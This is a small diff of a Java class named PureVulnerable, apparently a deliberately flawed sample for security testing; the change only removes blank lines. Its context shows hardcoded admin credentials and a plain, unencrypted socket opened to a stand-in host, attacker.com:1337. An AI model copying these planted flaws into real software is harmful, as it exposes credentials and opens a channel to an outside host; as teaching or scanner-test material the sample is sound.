@@ -38,13 +38,10 @@ public class PureVulnerable {
         } else {
             System.out.println("File not found.");
         }
-
-        
         // 🔥 4. Hardcoded Credentials (optional)
         String username = "admin";
         String password = "supersecret123"; // hardcoded password
         System.out.println("Logging in with user: " + username);
-
         // 🔥 5. Insecure Socket (no TLS)
         System.out.println("Opening plain socket to attacker.com:1337...");
         Socket socket = new Socket("attacker.com", 1337); // not encrypted
